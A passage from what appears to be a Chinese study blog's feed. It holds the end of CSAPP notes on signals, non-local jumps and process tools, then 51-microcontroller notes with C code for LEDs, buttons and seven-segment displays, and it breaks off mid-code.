<span class="title">siglongjmp</span><span class="params">(sigjmp_buf env, <span class="type">int</span> retval)</span></span>;<span class="comment">//从不返回。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>类似于 C 语言中的 try-catch 块，在函数调用链中实现了异常的传递。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">sigjmp_buf buf;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handler</span><span class="params">(<span class="type">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">siglongjmp</span>(buf, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">sigsetjmp</span>(buf, <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">Signal</span>(SIGINT, handler);</span><br><span class="line">        <span class="built_in">Sio_puts</span>(<span class="string">&quot;starting\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">Sio_puts</span>(<span class="string">&quot;restarting\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">Sio_puts</span>(<span class="string">&quot;processing...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* Control never reaches here */</span></span><br><span class="line">&#125;</span><br><span class="line">linux&gt; ./restart</span><br><span class="line">starting</span><br><span class="line">processing </span><br><span class="line">processing </span><br><span class="line">Ctrl+C</span><br><span class="line">restarting</span><br><span class="line">processing </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="操作进程的工具"><a href="#操作进程的工具" class="headerlink" title="操作进程的工具"></a>操作进程的工具</h3><ul><li>STRACE: 打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。对于好奇的学生而言，这是一个令人着迷的工具。用 -static 编译你的程序，能得到一个更干净的、不带有大量与共享库相关的输出的轨迹。</li><li>PS: 列出当前系统中的进程（包括僵死进程）。</li><li>TOP: 打印出关千当前进程资源使用的信息，HTOP更加详细。</li><li>PMAP: 显示进程的内存映射</li><li>/proc: 一个虚拟文件系统，以 ASCII 文本格式输出大量内核数据结构的内容，用户程序可以读取这些内容 比如，输入 “cat /proc/loadavg”, 可以看到你的 Linux 系统上当前的平均负载。</li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>​    异常控制流 (ECF) 发生在计算机系统的各个层次，是计算机系统中<code>提供并发的基本机制</code>。</p><ul><li><p>在硬件层 ，异常是由处理器中的事件触发的控制流中的 突变。控制流 传递给一个软件处理程序，该处理程序进行一些处理，然后返回控制给被中断的控制流。<br>有四种不同类型的异常：中断、故障、终 止和陷阱。</p></li><li><p>在操作系统层，内核用 ECF 提供进程的基本概念 进程提供给应用两个重要的抽象： 1) 逻辑控制流，它提供给每个程序一个假象，好像它是在独占地使用处理器， 2) 私有地址空间，它提供给每个程序一个假象，好像它是在独占地使用主存</p></li><li><p>在操作系统和应用程序之间的接口处，应用程序可以创建子进程，等待它们的子进程停止或者终止，运行新的程序，以及捕获来自其他进程的信号。信号处理的语义是微妙的，并且随系统不同而不同。然而， 在与 Posix 兼容的系统上存在 一些机制，允许程序 清楚 地指定期望的信号处理语义。</p></li><li><p>最后 ，在应用层， 程序可以使用非本地跳转来规避正常的调用 返回栈规则，并且直接从一个函数分支到另一个函数。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> book </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>51单片机学习0x1</title>
      <link href="/2024/02/05/51%E5%8D%95%E7%89%87%E6%9C%BA/51%E5%8D%95%E7%89%87%E6%9C%BA0x1/"/>
      <url>/2024/02/05/51%E5%8D%95%E7%89%87%E6%9C%BA/51%E5%8D%95%E7%89%87%E6%9C%BA0x1/</url>
      
        <content type="html"><![CDATA[<p>江科大51单片机学习笔记</p><h3 id="单片机"><a href="#单片机" class="headerlink" title="单片机"></a>单片机</h3><p>​    单片机不是完成某一个逻辑功能的芯片，而是把一个计算机系统集成到一个芯片上。相当于一个微型的计算机。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205164420483.png" alt="image-20240205164420483"></p><p>命名规则：</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205171525348.png" alt="image-20240205171525348"></p><h4 id="51单片机"><a href="#51单片机" class="headerlink" title="51单片机"></a>51单片机</h4><p>　<code>51单片机</code>是对所有兼容<code>Intel8031指令系统</code>的单片机的统称，这一系列的单片机的始祖是Intel的<code>8031单片机</code>，后来随着flash ROM技术的发展，8031单片机取得了长足的进展成为了应用最广泛的8bit单片机之一，他的代表型号就是ATMEL公司的AT89系列。<img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/d2389f408a88b749f84fd3622d5db44.jpg" alt="d2389f408a88b749f84fd3622d5db44"></p><h5 id="芯片"><a href="#芯片" class="headerlink" title="芯片"></a>芯片</h5><p>8051是一种8位元的单芯片微控制器，属于MCS-51单芯片的一种。8051单芯片是<code>同步式的顺序逻辑系统</code>，整个系统的工作完全是依赖系统内部的时脉信号，用以来产生各种动作周期及同步信号。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205174704298.png" alt="image-20240205174704298"></p><ul><li>看门狗：在单片机运行中，可能会遇到电磁场等恶劣环境干扰失控，造成程序进入死循环，程序跑飞(死机)等意外故障，程序的正常运行被打断，系统无法继续运行，陷入停滞状态，发生不可预料的后果。此时可通过按下复位按钮，强制系统复位。但更理想的实现是通过一套监控系统，实时监视MCU运行状态，在运行异常时，使系统摆脱故障状态。看门狗(Watchdog)技术能够解决这一问题。</li></ul><h5 id="单片机管脚图"><a href="#单片机管脚图" class="headerlink" title="单片机管脚图"></a>单片机管脚图</h5><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205200323631.png" alt="image-20240205200323631"></p><p>引脚说明：</p><ul><li><p>主电源引脚</p><p>VCC：电源输入，接＋5V电源<br>GND：接地线</p></li><li><p>外接<code>晶振引脚</code><br>XTAL1，XTAL2</p></li><li><p>控制引脚<br>RST、PSEN、ALE/PROG、EA/Vpp</p></li><li><p>可编程输入/输出引脚<br>51单片机有4组8位的可编程I/O口，分别为P0、P1、P2、P3口，每个口有8位（8根引脚）(单片机为八位），共32根。</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205181205796.png" alt="image-20240205181205796"></p><h5 id="单片机最小系统"><a href="#单片机最小系统" class="headerlink" title="单片机最小系统"></a>单片机最小系统</h5><p>单片机最小系统也称为单片机最小应用系统，是指使用最少的原件组成单片机可以工作的系统</p><p>单片机最小系统的三要素为：<code>电源电路</code>、<code>晶振电路</code>和<code>复位电路</code>。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205182847541.png" alt="image-20240205182847541"></p><blockquote><p>小圆坑或者小标记所对应的引脚就是这个芯片的第 1脚，然后逆时针方向数下去，即 1 到最后一个引脚。</p></blockquote><ul><li><code>电源</code>：供电</li><li><code>晶振</code>：晶振，又叫晶体振荡器，从这个名字上就可以看出，它注定一生都要不停的振荡。它起到的作用是为单片机系统提供基准时钟信号。电容的作用是帮助晶振起振，并<strong>维持振荡信号的稳定</strong>。</li><li>复位电路：分为外部RST复位，软件复位，掉电复位/上电复位，看门狗复位。</li><li>寄存器是连接软硬件的媒介</li><li><p>在单片机中寄存器就是一段特殊的RAM存储器，一方面，寄存器可以存储和读取数据，另一方面，每一个寄存器背后都连接了一根导线，控制着电路的连接方式</p></li><li><p>寄存器相当于一个复杂机器的“操作按钮”</p></li></ul><h4 id="51单片机与stm32单片机的区别"><a href="#51单片机与stm32单片机的区别" class="headerlink" title="51单片机与stm32单片机的区别"></a>51单片机与stm32单片机的区别</h4><ul><li>51是8bit单片机，stm32是32bit单片机</li><li>51单片机采用<code>冯·诺依曼结构（von Neumann architecture）</code>，stm32单片机采用<code>普林斯顿体系结构（Princetion architecture）称作冯诺依曼体系</code></li><li>……</li></ul><blockquote><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/v2-3333594d99b4c825d99737d7d771b99c_1440w.jpeg" alt="哈佛结构和冯诺依曼结构"></h2><p>冯·诺依曼体系和哈佛总线体系二者的区别就是程序空间和数据空间是否是一体的。</p><p>冯·诺依曼结构的处理器使用同一个存储器，经由同一个总线传输。</p><p>哈佛结构是一种将<strong>程序指令存储</strong>和<strong>数据存储</strong>分开的存储器结构,可以使<strong>指令和数据有不同的数据宽度</strong>。<br/></p><p>哈佛结构设计复杂，但效率高。冯诺依曼结构则比较简单，但也比较慢。</p><p>详细可查看此文章:<a href="https://zhuanlan.zhihu.com/p/85847486">哈佛结构和冯诺依曼结构 - 知乎 (zhihu.com)</a></p></blockquote><ul><li>GPIO</li></ul><p><strong>GPIO（general purpose intput output）</strong>是通用输入输出端口的简称，可以通过软件来控制其输入和输出。51 单片机芯片的 GPIO 引脚与外部设备连接起来，从而实现与外部通讯、控制以及数据采集的功能。</p><ul><li>特殊的数据类型</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206115058946.png" alt="image-20240206115058946"></p><ul><li><p><code>sfr</code>（special function register）：特殊功能寄存器声明</p><p>例：sfr P0 = 0x80;</p><p>声明P0口寄存器，物理地址为0x80</p></li><li><p><code>sbit</code>（special bit）：特殊位声明</p><p>例：sbit P0_1 = 0x81;  或  sbit P0_1 = P0^1;</p><p>声明P0寄存器的第1位</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240226222902130.png" alt="image-20240226222902130"></p><ul><li><code>可位寻址/不可位寻址</code>：说白了就是可位寻址允许对寄存器某位操作，不可位寻址只能对某个寄存器进行整体赋值操作</li><li>对<code>不可位寻址的寄存器</code>，若要只操作其中一位而不影响其它位时，可用“&amp;=”、“|=”、“^=”的方法进行位操作</li></ul><ol><li><code>&amp;=</code>，101 &amp; 011 = 001，可用于置0，也可用于修改特定位</li><li><code>|=</code>，101 | 011 = 111，可用于置1</li><li><code>^=</code>，101 ^ 011 = 110，取反</li></ol><ul><li>对<code>可位寻址的寄存器</code>，可直接赋值，如P1_4=1。</li></ul><h3 id="LED"><a href="#LED" class="headerlink" title="LED"></a>LED</h3><p>发光二极管(Light Emitting Diode),它具有单向导电性.</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205231346034.png" alt="image-20240205231346034"></p><p>在单片机中，1代表高电平，0代表低电平。由图可知， LED 采用共阳接法，即所有LED 阳极管脚接电源 VCC，当p2口为低电平时，产生电势差，LED发光。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205231725336.png" alt="image-20240205231725336"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/697dd16c964ba808f82a101c1c64750.jpg" alt="697dd16c964ba808f82a101c1c64750"></p><p>图中电阻显示为102，实际值为1000。</p><p>电阻值为除最后一位+最后一位值*0.</p><p>由于单片机需要不停运行，查看汇编可知，在汇编代码结束前会返回到main函数开始处，因此单片机不会停止。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206140357310.png" alt="image-20240206140357310"></p><p>我们需要在<code>main</code>最后加个无限循环以保证单片机的正常运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;reg52.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;intrins.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LED P2</span></span><br><span class="line">sbit LED1=P2^<span class="number">0</span>;  <span class="comment">//只修改LED1</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Delay500ms</span><span class="params">(<span class="type">void</span>)</span><span class="comment">//@12.000MHz 可以设置参数调整时间为500ms的整数倍</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data i, j, k;</span><br><span class="line"></span><br><span class="line">_nop_();</span><br><span class="line">i = <span class="number">4</span>;</span><br><span class="line">j = <span class="number">205</span>;</span><br><span class="line">k = <span class="number">187</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (--k);</span><br><span class="line">&#125; <span class="keyword">while</span> (--j);</span><br><span class="line">&#125; <span class="keyword">while</span> (--i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span>  n=<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(n--)<span class="comment">//8个LED灯闪烁</span></span><br><span class="line">&#123;</span><br><span class="line">LED=<span class="number">0xFF</span>;</span><br><span class="line">Delay500ms();</span><br><span class="line">LED=<span class="number">0x00</span>;</span><br><span class="line">Delay500ms();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">n=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">while</span>(n--)<span class="comment">//流水灯方式一</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">LED=~(<span class="number">0x01</span>&lt;&lt;i);</span><br><span class="line">Delay500ms();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LED=~<span class="number">0x01</span>;<span class="comment">//流水灯方式二</span></span><br><span class="line">Delay500ms();</span><br><span class="line">n=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++) </span><br><span class="line">&#123;</span><br><span class="line">LED=_crol_(LED,<span class="number">1</span>);<span class="comment">//_crol_函数相当于一个队列内循环移动</span></span><br><span class="line">Delay500ms();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++) </span><br><span class="line">&#123;</span><br><span class="line">LED=_cror_(LED,<span class="number">1</span>);</span><br><span class="line">Delay500ms();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">LED=<span class="number">0x00</span>;<span class="comment">//LED全亮</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="独立按键控制"><a href="#独立按键控制" class="headerlink" title="独立按键控制"></a>独立按键控制</h3><p>按键是一种电子开关，使用时轻轻按开关按钮就可使开关接通，当松开手时, 开关断开。实现原理是通过轻触按键内部的金属弹片受力弹动来实现接通和断开。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206144137515.png" alt="image-20240206144137515">可以看到我们需要修改P3。</p><ul><li>对于机械开关，当机械触点断开、闭合时，由于机械触点的弹性作用，一个开关在闭合时不会马上稳定地接通，在断开时也不会一下子断开，所以在开关闭合及断开的瞬间会伴随一连串的抖动。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206144523214.png" alt="image-20240206144523214"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span> <span class="comment">//此头文件包含单独对每个寄存器模块的控制</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;intrins.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LED P2</span></span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">Delay10ms</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n)</span><span class="comment">//delay</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data i, j;</span><br><span class="line"><span class="keyword">while</span>(n--)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">117</span>;</span><br><span class="line">j = <span class="number">184</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (--j);</span><br><span class="line">&#125; <span class="keyword">while</span> (--i);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n=<span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> LEDNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)<span class="comment">//不断对寄存器进行检测</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(P3_1==<span class="number">0</span>)<span class="comment">//LED流水线，运行中不断加快</span></span><br><span class="line">&#123;</span><br><span class="line">LED=~<span class="number">0x01</span>;</span><br><span class="line">Delay10ms(n*<span class="number">5</span>);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++) </span><br><span class="line">&#123;</span><br><span class="line">LED=_crol_(LED,<span class="number">1</span>);</span><br><span class="line">Delay10ms(n*<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++) </span><br><span class="line">&#123;</span><br><span class="line">LED=_cror_(LED,<span class="number">1</span>);</span><br><span class="line">Delay10ms(n*<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">LED=<span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(P3_0==<span class="number">0</span>)<span class="comment">//LED按键控制全部LED灯</span></span><br><span class="line">&#123;</span><br><span class="line">Delay10ms(<span class="number">2</span>);<span class="comment">//消抖</span></span><br><span class="line"><span class="keyword">while</span>(P3_0==<span class="number">0</span>);</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line">LED=~LED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(P3_2==<span class="number">0</span>)<span class="comment">//实现二进制加法</span></span><br><span class="line">&#123;</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(P3_2==<span class="number">0</span>);</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line">LED=~(LEDNum++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(P3_3==<span class="number">0</span>)  <span class="comment">//LED左移与右移</span></span><br><span class="line">&#123;</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(P3_2==<span class="number">0</span>);</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line">LED=<span class="number">0xFE</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(P3_0==<span class="number">0</span>)<span class="comment">//左移</span></span><br><span class="line">&#123;</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(P3_0==<span class="number">0</span>);</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line">LED=_cror_(LED,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(P3_2==<span class="number">0</span>)<span class="comment">//右移</span></span><br><span class="line">&#123;</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(P3_2==<span class="number">0</span>);</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line">LED=_crol_(LED,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(P3_1==<span class="number">0</span>)<span class="comment">//退出</span></span><br><span class="line">&#123;</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(P3_1==<span class="number">0</span>);</span><br><span class="line">Delay10ms(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">LED=<span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数码管"><a href="#数码管" class="headerlink" title="数码管"></a>数码管</h3><ul><li>LED数码管：数码管是一种简单、廉价的显示器，是由多个发光二极管封装在一起组成“8”字型的器件</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206161447902.png" alt="image-20240206161447902"></p><p>通过控制LED管来控制数码管的显示。<img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206161459131.png" alt="image-20240206161459131"></p><p>多个数码管共用引脚。</p><blockquote><p><code>74HC245</code>是一种三态输出、八路信号收发器，主要应用于大屏显示，以及其它的消费类电子产品中增加驱动。</p><p><code>74HC138</code>是常用的数字芯片，是一种3入8出译码器,三位表示八位。</p><p>这也是为什么LED采用共阳极接法，因为P2口输入的电流不够。LED灯采用共阴极接法亮度会小于共阴极接法。</p></blockquote><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206162055956.png" alt="image-20240206162055956"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206170822230.png" alt="image-20240206170822230"></p><p>数码管的消隐(消音)：位选与段选的执行间的影响</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> NixieTable[]=&#123;<span class="number">0x3F</span>,<span class="number">0x06</span>,<span class="number">0x5B</span>,<span class="number">0x4F</span>,<span class="number">0x66</span>,<span class="number">0x6D</span>,<span class="number">0x7D</span>,<span class="number">0x07</span>,<span class="number">0x7F</span>,<span class="number">0x6F</span>,<span class="number">0x77</span>,<span class="number">0x7C</span>,<span class="number">0x39</span>,<span class="number">0x5E</span>,<span class="number">0x79</span>,<span class="number">0x71</span>,<span class="number">0x00</span>&#125;;<span class="comment">//段码数据</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Delay</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> xms)</span> <span class="comment">//delay</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> 